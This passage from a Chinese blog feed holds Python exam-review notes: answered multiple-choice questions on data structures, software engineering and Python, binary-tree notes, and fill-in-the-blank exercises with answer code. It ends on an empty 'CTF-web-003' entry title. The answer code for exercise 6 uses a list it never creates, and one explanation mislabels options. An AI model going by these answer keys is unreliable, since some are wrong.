class="line">D.ABCDEFGH</span><br><span class="line"></span><br><span class="line">【您的选择】C  </span><br><span class="line">【题目解析】</span><br><span class="line">二叉树遍历可以分为<span class="number">3</span>种：前序遍历（访问根结点在访问左子树和访问右子树之前）、中序遍历（访问根结点在访问左子树和访问右子树两者之间）、后序遍历（访问根结点在访问左子树和访问右子树之后）。本题中前序遍历为ABDEGCFH，中序遍历为DBGEAFHC，后序遍历为DGEBHFCA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、下面不属于软件工程三要素的是()。</span><br><span class="line"></span><br><span class="line">A.环境</span><br><span class="line">B.工具 </span><br><span class="line">C.过程 </span><br><span class="line">D.方法 </span><br><span class="line"></span><br><span class="line">【您的选择】A</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、软件集成测试不采用（）。</span><br><span class="line"></span><br><span class="line">A.自顶向下增量组装</span><br><span class="line">B.自底向上增量组装 </span><br><span class="line">C.迭代式组装 </span><br><span class="line">D.一次性组装</span><br><span class="line"></span><br><span class="line">【您的选择】C 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">集成测试时将模块组装成程序通常采用两种方式:非增量方式组装与增量增量方式组装。</span><br><span class="line">    非增量方式也称为一次性组装方式；</span><br><span class="line">    增量方式又分为自顶向下，自底向上，自顶向下与自底向上相结合的混合增量方法</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、数据流图（DFD）的作用是（）。</span><br><span class="line"></span><br><span class="line">A.支持软件系统功能建模</span><br><span class="line">B.支持软件系统的面向对象分析 </span><br><span class="line">C.描述软件系统的控制流 </span><br><span class="line">D.描述软件系统的数据结构</span><br><span class="line"></span><br><span class="line">【您的选择】A 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">数据流图是描述数据处理过程的工具，是需求理解的逻辑模型的图形表示，它直接支持系统的功能建模</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">10</span>、定义学生的关系模式如下:S(S<span class="comment">#,Sn,Sex,Age,D#,Da)(其属性分别为学号、姓名、性别、年龄、所属学院、院长)该关系的范式最高是()。</span></span><br><span class="line"></span><br><span class="line">A<span class="number">.1</span>NF</span><br><span class="line">B<span class="number">.2</span>NF </span><br><span class="line">C<span class="number">.3</span>NF </span><br><span class="line">D.BCNF </span><br><span class="line"></span><br><span class="line">【您的选择】B 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">关系数据库中的关系是要满足一定要求的，满足不同程度要求的为不同的范式。满足最低要求的叫第一范式，简称1NF。在满足第一范式的基础上，进一步满足更多要求规范则是第二范式。然后在满足第二范式的基础上，还可以再满足第三范式，以此类推。对于关系模式，若其中的每个属性都已不能再分为简单项，则它属于第一范式。若某个关系R为第一范式，并且R中每一个非主属性完全依赖于R的某个候选键，则称其为第二范式。第二范式消除了非主属性对主键的部分依赖如果关系R是第二范式，并且每个非主属性都不传递依赖于R的候选键，则称R为第三范式。（传递依赖：在关系模式中，如果Y→X，X→A，且X不决定Y和A不属于X，那么Y→A是传递依赖。）本题中，关系S满足第一范式和第二范式，但是S<span class="comment">#→D#，D#→Da，存在传递依赖，因此不满足第三范式。该关系的范式最高是2NF。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">15</span>、以下关于语言类型的描述中,正确的是()。</span><br><span class="line"></span><br><span class="line">A.静态语言采用解释方式执行,脚本语言采用编译方式执行</span><br><span class="line">B.解释是将源代码一次性转换成目标代码同时逐条运行目标代码的过程 </span><br><span class="line">C.C语言是静态编译语言,Python语言是脚本语言 </span><br><span class="line">D.编译是将目标代码转换成源代码的过程 </span><br><span class="line"></span><br><span class="line">【您的选择】C 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">高级语言根据计算机执行机制的不同可分为两类：静态语言和动态语言。静态语言采用编译方式执行，脚本语言采用解释方式执行。例如，C语言是静态语言，Python是脚本语言。编译是将源代码转换成目标代码的过程。解释是将源代码逐条转换成目标代码同时逐条运行目标代码的过程。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">17</span>、以下关于函数的描述,错误的是()。</span><br><span class="line"></span><br><span class="line">A.使用函数的目的只是为了增加代码复用。</span><br><span class="line">B.函数是一种功能抽象 </span><br><span class="line">C.使用函数后，代码的维护难度降低了 </span><br><span class="line">D.函数名可以是任何有效的Python标识符 </span><br><span class="line"></span><br><span class="line">【您的选择】A 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">函数是一种功能抽象，使用函数后，函数处修改则所有调用的函数处都被修改，所以大大的降低了代码的维护难度，函数名可以是任何有效的Python表示符。增加代码复用只是函数的一个优点之一。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">20</span>、以下关于分支和循环结构的描述中,错误的是()。</span><br><span class="line"></span><br><span class="line">A.While循环只能用来实现无限循环</span><br><span class="line">B.保留字<span class="keyword">break</span>可以终止一个循环 </span><br><span class="line">C.所有的<span class="keyword">for</span>分支都可以用<span class="keyword">while</span>循环改写 </span><br><span class="line">D.<span class="keyword">continue</span>可以停止后续代码的执行,从循环的开头重新执行 </span><br><span class="line"></span><br><span class="line">【您的选择】A 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">Python中循环包括两种：遍历循环和无限循环。遍历循环使用保留字<span class="keyword">for</span>依次提取遍历结构元素进行处理；无限循环使用保留字<span class="keyword">while</span>根据判断条件执行程序。如果<span class="keyword">while</span>中判断条件可以执行一次或两次，<span class="keyword">while</span>中的语句块也就执行一次或两次，A项错误。循环结构有两个辅助循环控制保留字：<span class="keyword">break</span>和<span class="keyword">continue</span>。<span class="keyword">break</span>用来跳出最内层<span class="keyword">for</span>或<span class="keyword">while</span>循环，脱离该循环后程序从循环后的代码继续执行；<span class="keyword">continue</span>用来结束当前当次循环，即跳出循环体中下面尚未执行的语句，但跳不出当前循环。两者的区别是：<span class="keyword">continue</span>语句只结束本次循环，不终止整个循环的执行，而<span class="keyword">break</span>具备结束循环的能力。C、D两项正确。所有的<span class="keyword">for</span>分支都可以用<span class="keyword">while</span>循环改写，B项正确。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">21</span>、以下关于函数优点的描述中,正确的是()。</span><br><span class="line"></span><br><span class="line">A.函数可以表现程序的复杂度</span><br><span class="line">B.函数可以使程序更加模块化 </span><br><span class="line">C.函数可以减少代码多次使用 </span><br><span class="line">D.函数便于书写 </span><br><span class="line"></span><br><span class="line">【您的选择】B 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">函数定义：函数是指一组语句的集合通过一个名字（函数名）封装起来，要想执行这个函数，只需要调用其函数名即可。函数能提高应用的模块性和代码的重复利用率。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">24</span>、以下关于Python函数的描述中,错误的是()。</span><br><span class="line"></span><br><span class="line">A.Python程序的main函数可以改变为其他名称</span><br><span class="line">B.如果Python程序包含一个函数main(),这个函数与其他函数地位相同 </span><br><span class="line">C.Python程序可以不包含main函数 </span><br><span class="line">D.Python程序需要包含一个主函数且只能包含一个主函数 </span><br><span class="line"></span><br><span class="line">【您的选择】D 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">Python是一种脚本解释语言，与C/C++和Java有很大的区别，没有主函数的说法。当运行单个python文件时，如文件名为a.py，则a的属性name==<span class="string">&#x27;_main_&#x27;</span>，并不是首先执行所谓的main函数。Python整个程序自顶向下顺序执行。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">27</span>、在Python语言中,不属于组合数据类型的是()。</span><br><span class="line"></span><br><span class="line">A.复数类型</span><br><span class="line">B.字典类型 </span><br><span class="line">C.列表类型 </span><br><span class="line">D.元组类型 </span><br><span class="line"></span><br><span class="line">【您的选择】A 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">最常用的组合数据类型有大类，分别是集合类型、序列类型和映射类型。其中序列类型包括字符串类型、列表类型和元组类型，字典类型属于映射类型。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">30</span>、关于Python文件的‘+’打开模式，以下选项正确的描述是()。</span><br><span class="line"></span><br><span class="line">A.只读模式</span><br><span class="line">B.追加写模式 </span><br><span class="line">C.与r/w/a/x一同使用，在原功能基础上增加同时读写功能 </span><br><span class="line">D.覆盖写模式 </span><br><span class="line"></span><br><span class="line">【您的选择】C 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">r表示只读模式，a表示追加写模式，w表示覆盖写模式，+可以和r/w/a/x一同使用，表示在原功能基础上增加同时读写功能。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">32</span>、以下代码的输出结果是()。</span><br><span class="line"></span><br><span class="line">L1 =[<span class="string">&#x27;abc&#x27;</span>, [<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;456&#x27;</span>]]</span><br><span class="line">L2 = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(L1 &gt; L2)</span><br><span class="line"></span><br><span class="line">A.TypeError: <span class="string">&#x27;&gt;&#x27;</span> <span class="keyword">not</span> supported between instances of <span class="string">&#x27;list&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;str&#x27;</span></span><br><span class="line">B.<span class="literal">True</span> </span><br><span class="line">C.<span class="literal">False</span> </span><br><span class="line">D<span class="number">.1</span> </span><br><span class="line"></span><br><span class="line">【您的选择】B 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">本题考查的是两个列表的大小比较方法，列表比较大小可采用从左到右依次比较元素大小，若产生结果则不需继续比较。本题第一个元素是‘abc’和‘<span class="number">1</span>’比较，字符串比较大小也是采用此方法，所以‘a’比‘<span class="number">1</span>’字符大，则L1大于L2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">36</span>、以下属于 Python 脚本程序转变为可执行程序的第三方库的是：()。</span><br><span class="line"></span><br><span class="line">A.scrapy</span><br><span class="line">B.numpy </span><br><span class="line">C.pyinstaller </span><br><span class="line">D.requests </span><br><span class="line"></span><br><span class="line">【您的选择】C 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">numpy是主要用作数据分析，scrapy和requests主要用于爬虫， pyinstaller主要用作打包程序。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">38</span>、在Python语言中,包含矩阵运算的第三方库是()。</span><br><span class="line"></span><br><span class="line">A.numpy</span><br><span class="line">B.PyQt5 </span><br><span class="line">C.wordcloud </span><br><span class="line">D.wxPython </span><br><span class="line"></span><br><span class="line">【您的选择】A 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">numpy是Python的一种开源数值计算扩展第三方库，用于处理数据类型相同的多维数组，简称“数组”。numpy可以用来存储和处理大型矩阵，提供了许多高级的数组编程工具，如矩阵运算、矢量处理、N维数据变换等。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">39</span>、在Python语言中,能够处理图像的第三方库是()。</span><br><span class="line"></span><br><span class="line">A.pyinstaller</span><br><span class="line">B.pyserial </span><br><span class="line">C.pygame </span><br><span class="line">D.PIL </span><br><span class="line"></span><br><span class="line">【您的选择】D 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">PIL库是Python语言在图像处理方面的重要的第三方库，支持图像存储、处理和显示，它能够处理几乎所有的图片格式，可以完成对图像的缩放、剪裁、叠加以及图像添加线条、图像和文字等操作。使用Python语言处理图像相关的程序，首选PIL库。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">40</span>、在Python语言中,属于Web开发框架第三方库的是()。</span><br><span class="line"></span><br><span class="line">A.Mayavi</span><br><span class="line">B.Flask </span><br><span class="line">C.PyQt5 </span><br><span class="line">D.time </span><br><span class="line"></span><br><span class="line">【您的选择】B 恭喜您答对了!  </span><br><span class="line">【题目解析】</span><br><span class="line">在Python语言中，属于Web开发框架第三方库的有：Django库、Pyramid库和Flask库。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="选择题难点"><a href="#选择题难点" class="headerlink" title="选择题难点"></a>选择题难点</h1><p>二叉树=&gt;数据结构<br>数据间的关系<br>栈空间</p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="集合："><a href="#集合：" class="headerlink" title="集合："></a>集合：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = &#123;<span class="number">1</span>,<span class="number">23</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">54</span>,<span class="number">5</span>,<span class="number">7</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a&amp;b</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a^b</span><br><span class="line">&#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">23</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b^a</span><br><span class="line">&#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">54</span>, <span class="number">23</span>, <span class="number">7</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a|b</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">54</span>, <span class="number">23</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><h3 id="概念性"><a href="#概念性" class="headerlink" title="概念性"></a>概念性</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">总结点数=叶子结点数+度为<span class="number">1</span>的结点数+度为<span class="number">2</span>的结点数</span><br><span class="line"></span><br><span class="line">度数：最小为<span class="number">0</span>，最大为<span class="number">2</span></span><br><span class="line">度数的含义：</span><br><span class="line">    代表着子节点的个数</span><br><span class="line">    叶子节点数 =等同于=&gt; 度为<span class="number">0</span>的节点数</span><br><span class="line">深度：观察树形结构即可得出</span><br><span class="line">       <span class="number">10</span></span><br><span class="line">      /  \</span><br><span class="line">     <span class="number">6</span>    <span class="number">15</span></span><br><span class="line">    / \  /  \</span><br><span class="line">   <span class="number">3</span>   <span class="number">8</span> <span class="number">12</span>   <span class="number">18</span></span><br><span class="line">上面二叉树深度为<span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二叉树的性质：</span><br><span class="line">    在任意一棵二叉树中，度为<span class="number">0</span>的结点(即叶子结点)总是比度为<span class="number">2</span>的结点多一个。</span><br><span class="line">    </span><br><span class="line">    每个节点最多只有两个子节点，分别称为左子节点和右子节点。</span><br><span class="line">    </span><br><span class="line">    左子树和右子树都是二叉树，且它们是互不相交的。</span><br><span class="line">    </span><br><span class="line">    如果在二叉树中给每个节点赋予一个方向，使每个节点都只有一个父节点，那么这样的二叉树就称为有向二叉树（或者有向树）。</span><br><span class="line">    </span><br><span class="line">    在一棵二叉树中，第i层上最多有<span class="number">2</span>^(i-<span class="number">1</span>)个节点。</span><br><span class="line">    </span><br><span class="line">    深度为k的二叉树最多有<span class="number">2</span>^k - <span class="number">1</span>个节点。</span><br><span class="line">    </span><br><span class="line">    对于任意一棵非空二叉树，如果叶子节点的个数为n0，度为<span class="number">2</span>的节点个数为n2，则n0 = n2 + <span class="number">1</span>。</span><br><span class="line">    </span><br><span class="line">    在一棵二叉树中，如果节点的左子树深度为h1，右子树深度为h2，则该节点的深度为<span class="built_in">max</span>(h1, h2) + <span class="number">1</span>。</span><br><span class="line">    </span><br><span class="line">    一棵深度为k，且有<span class="number">2</span>^k - <span class="number">1</span>个节点的二叉树，称为满二叉树。</span><br><span class="line">    </span><br><span class="line">    一棵深度为k，且有n个节点的二叉树，当且仅当其每一个节点都与深度为k的满二叉树中，序号为<span class="number">1</span>至n的节点对应时，称之为完全二叉树。</span><br><span class="line">    </span><br><span class="line">    对于一棵有n个节点的完全二叉树，如果节点按照从上到下、从左到右的顺序依次编号为<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,...,n，则对于任意一个节点i（<span class="number">1</span>&lt;=i&lt;=n），有：</span><br><span class="line">        (<span class="number">1</span>) 如果i=<span class="number">1</span>，则该节点是根节点，无父节点；否则，其父节点编号为i/<span class="number">2</span>。</span><br><span class="line">        (<span class="number">2</span>) 如果2i&gt;n，则该节点无左子节点；否则，其左子节点的编号为2i。</span><br><span class="line">        (<span class="number">3</span>) 如果2i+<span class="number">1</span>&gt;n，则该节点无右子节点；否则，其右子节点的编号为2i+<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="前序中序后序"><a href="#前序中序后序" class="headerlink" title="前序中序后序"></a>前序中序后序</h3><p><a href="http://easycode.top/">二叉树在线生成</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">在二叉树中，前序遍历、中序遍历、后序遍历是三种常用的遍历方式，它们分别对应不同的遍历顺序，具体定义如下：</span><br><span class="line"></span><br><span class="line">    前序遍历：先访问根节点，然后递归地访问左子树和右子树，即 根-左-右 的顺序。</span><br><span class="line"></span><br><span class="line">    中序遍历：先递归地访问左子树，然后访问根节点，最后递归地访问右子树，即 左-根-右 的顺序。</span><br><span class="line"></span><br><span class="line">    后序遍历：先递归地访问左子树和右子树，然后访问根节点，即 左-右-根 的顺序。</span><br><span class="line"></span><br><span class="line">以下是一个示例二叉树：</span><br><span class="line"></span><br><span class="line">      <span class="number">1</span></span><br><span class="line">    /   \</span><br><span class="line">   <span class="number">2</span>     <span class="number">3</span></span><br><span class="line">  / \   / \</span><br><span class="line"> <span class="number">4</span>   <span class="number">5</span> <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"></span><br><span class="line">对应的前序遍历序列是：<span class="number">1</span> <span class="number">2</span> <span class="number">4</span> <span class="number">5</span> <span class="number">3</span> <span class="number">6</span> <span class="number">7</span>；</span><br><span class="line"></span><br><span class="line">对应的中序遍历序列是：<span class="number">4</span> <span class="number">2</span> <span class="number">5</span> <span class="number">1</span> <span class="number">6</span> <span class="number">3</span> <span class="number">7</span>；</span><br><span class="line"></span><br><span class="line">对应的后序遍历序列是：<span class="number">4</span> <span class="number">5</span> <span class="number">2</span> <span class="number">6</span> <span class="number">7</span> <span class="number">3</span> <span class="number">1</span>。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 计算机等级考试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-复习日志-0005</title>
      <link href="/2023/03/23/Python-Study-0005/"/>
      <url>/2023/03/23/Python-Study-0005/</url>
      
        <content type="html"><![CDATA[<p>基础复习</p><span id="more"></span><h1 id="题1"><a href="#题1" class="headerlink" title="题1"></a>题1</h1><p><img src="c1.jpg" alt="计算第三边"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请在______ 处使用一行代码或表达式替换</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 注意：请不要修改其他已给出代码</span></span><br><span class="line"></span><br><span class="line">ntxt = <span class="built_in">input</span>(<span class="string">&quot;请输入4个数字(空格分隔):&quot;</span>)</span><br><span class="line">______</span><br><span class="line">x0 = <span class="built_in">eval</span>(nls[<span class="number">0</span>])</span><br><span class="line">y0 = <span class="built_in">eval</span>(nls[<span class="number">1</span>])</span><br><span class="line">x1 = <span class="built_in">eval</span>(nls[<span class="number">2</span>])</span><br><span class="line">y1 = <span class="built_in">eval</span>(nls[<span class="number">3</span>])</span><br><span class="line">r = <span class="built_in">pow</span>(<span class="built_in">pow</span>(x1-x0, <span class="number">2</span>) + <span class="built_in">pow</span>(y1-y0, <span class="number">2</span>), ______) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:.2f&#125;&quot;</span>.<span class="built_in">format</span>(r))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>答案</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ntxt = <span class="built_in">input</span>(<span class="string">&quot;请输入4个数字(空格分隔):&quot;</span>)</span><br><span class="line">nls = ntxt.split()</span><br><span class="line">x0 = <span class="built_in">eval</span>(nls[<span class="number">0</span>])</span><br><span class="line">y0 = <span class="built_in">eval</span>(nls[<span class="number">1</span>])</span><br><span class="line">x1 = <span class="built_in">eval</span>(nls[<span class="number">2</span>])</span><br><span class="line">y1 = <span class="built_in">eval</span>(nls[<span class="number">3</span>])</span><br><span class="line">r = <span class="built_in">pow</span>(<span class="built_in">pow</span>(x1-x0, <span class="number">2</span>) + <span class="built_in">pow</span>(y1-y0, <span class="number">2</span>), <span class="number">0.5</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:.2f&#125;&quot;</span>.<span class="built_in">format</span>(r))</span><br></pre></td></tr></table></figure><h1 id="题2"><a href="#题2" class="headerlink" title="题2"></a>题2</h1><p><img src="c2.jpg" alt="jieba算均值"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请在______处使用一行代码或表达式替换</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 注意：请不要修改其他已给出代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ______</span><br><span class="line">txt = <span class="built_in">input</span>(<span class="string">&quot;请输入一段中文文本:&quot;</span>)</span><br><span class="line">______</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:.1f&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(txt)/<span class="built_in">len</span>(ls)))</span><br></pre></td></tr></table></figure><p>答案</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line">txt = <span class="built_in">input</span>(<span class="string">&quot;请输入一段中文文本:&quot;</span>)</span><br><span class="line">ls = jieba.lcut(txt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:.1f&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(txt)/<span class="built_in">len</span>(ls)))</span><br></pre></td></tr></table></figure><h1 id="题3"><a href="#题3" class="headerlink" title="题3"></a>题3</h1><p><img src="c3.jpg" alt="算编码值"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个数字:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;______&#125;&quot;</span>.<span class="built_in">format</span>(______))</span><br></pre></td></tr></table></figure><p>答案</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个数字:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:+^11&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">chr</span>(n-<span class="number">1</span>)+<span class="built_in">chr</span>(n)+<span class="built_in">chr</span>(n+<span class="number">1</span>)))</span><br></pre></td></tr></table></figure><h1 id="题4"><a href="#题4" class="headerlink" title="题4"></a>题4</h1><p><img src="c.jpg" alt="字符串格式化"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">input</span>(<span class="string">&quot;请输入一个字符串:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;_______&#125;&quot;</span>.<span class="built_in">format</span>(s))</span><br></pre></td></tr></table></figure><p>答案</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">input</span>(<span class="string">&quot;请输入一个字符串:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:=^20&#125;&quot;</span>.<span class="built_in">format</span>(s))</span><br></pre></td></tr></table></figure><h1 id="题5"><a href="#题5" class="headerlink" title="题5"></a>题5</h1><p><img src="c5.jpg" alt="斐波那契"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> ______:</span><br><span class="line">    <span class="built_in">print</span>(a, end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    a, b = ______</span><br></pre></td></tr></table></figure><p>答案</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a&lt;<span class="number">100</span>:</span><br><span class="line">    <span class="built_in">print</span>(a, end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    a, b = a+b,a</span><br></pre></td></tr></table></figure><h1 id="题6"><a href="#题6" class="headerlink" title="题6"></a>题6</h1><p><img src="c6.jpg" alt="JIEBA分词"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line">txt = <span class="built_in">input</span>(<span class="string">&quot;请输入一段中文文本:&quot;</span>)</span><br><span class="line">______</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ls[::-<span class="number">1</span>]:</span><br><span class="line">    ______</span><br></pre></td></tr></table></figure><p>答案</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line">txt = <span class="built_in">input</span>(<span class="string">&quot;请输入一段中文文本:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ls)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ls[::-<span class="number">1</span>]:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="题7"><a href="#题7" class="headerlink" title="题7"></a>题7</h1><p><img src="c7.jpg" alt="字符串格式"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入正整数:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;______&#125;&quot;</span>.<span class="built_in">format</span>(n))</span><br></pre></td></tr></table></figure><p>答案</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入正整数:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;:*&gt;15&#125;&quot;</span>.<span class="built_in">format</span>(n))</span><br></pre></td></tr></table></figure><h1 id="题8"><a href="#题8" class="headerlink" title="题8"></a>题8</h1><p><img src="c8.jpg" alt="格式化输出"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>]</span><br><span class="line">b =  <span class="built_in">eval</span>(<span class="built_in">input</span>()) <span class="comment">#例如：[1,2,3]</span></span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(___):</span><br><span class="line">    c.append(______)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>答案</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>]</span><br><span class="line">b =  <span class="built_in">eval</span>(<span class="built_in">input</span>()) <span class="comment">#例如：[1,2,3]</span></span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    c.append(a[i]+b[i])</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="题9"><a href="#题9" class="headerlink" title="题9"></a>题9</h1><p><img src="c9.jpg" alt="种子随机数"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">____________</span><br><span class="line">s = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    n = random.randint(___(<span class="number">2</span>)___)  <span class="comment"># 产生随机数</span></span><br><span class="line">    s = ___(<span class="number">3</span>)___  </span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p>答案</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0</span>)</span><br><span class="line">s = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    n = random.randint(<span class="number">1</span>,<span class="number">97</span>)  <span class="comment"># 产生随机数</span></span><br><span class="line">    s = s+n**<span class="number">2</span>  </span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 计算机等级考试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-003</title>
      <link href="/2023/03/22/CTF-web-003/"/>
      <url>/2023/03/22/CTF-web-003/</url>
      
